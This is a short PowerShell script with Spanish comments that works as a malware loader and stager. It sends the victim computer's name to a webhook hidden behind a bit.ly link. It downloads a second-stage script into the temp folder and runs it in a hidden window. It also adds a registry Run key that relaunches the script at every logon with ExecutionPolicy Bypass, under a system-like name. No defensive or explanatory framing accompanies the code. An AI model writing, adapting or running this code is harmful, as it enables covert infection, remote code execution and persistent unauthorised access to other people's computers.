# Nombre del script principal
$nombreScriptPrincipal = "sysw.ps1"
# Ruta de destino donde se guardará el script principal
$rutaDestino = "$env:temp\$nombreScriptPrincipal"
# URL del script principal a descargar
$urlScriptPrincipal = "URL_DEL_SCRIPT_PRINCIPAL.ps1"

# Función para enviar mensaje al webhook secundario
function SendMessageToSecondaryWebhook {
    try {
        Write-Host "Enviando mensaje al webhook secundario..."
        $message = "Computadora encendida: $($env:COMPUTERNAME)"
        Invoke-RestMethod -Uri "https://bit.ly/web_chupacabras" -Method Post -Body @{message=$message} -ContentType 'application/json'
    } catch {
        Write-Host "Error al enviar el mensaje al webhook secundario: $_"
    }
}

# Función para descargar y ejecutar el script principal
function DownloadAndRunScript {
    # Descargar el script principal
    Invoke-WebRequest -Uri $urlScriptPrincipal -OutFile $rutaDestino
    # Ejecutar el script principal
    Start-Process powershell.exe -ArgumentList "-File $rutaDestino" -WindowStyle Hidden
}

# Enviar mensaje al webhook secundario al iniciar Windows
SendMessageToSecondaryWebhook

# Descargar y ejecutar el script principal
DownloadAndRunScript

# Agregar entrada al registro para ejecutar el script al iniciar sesión del usuario
$registroScript = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $registroScript -Name "SyswScript" -Value "powershell.exe -ExecutionPolicy Bypass -File '$rutaDestino' -WindowStyle Hidden"
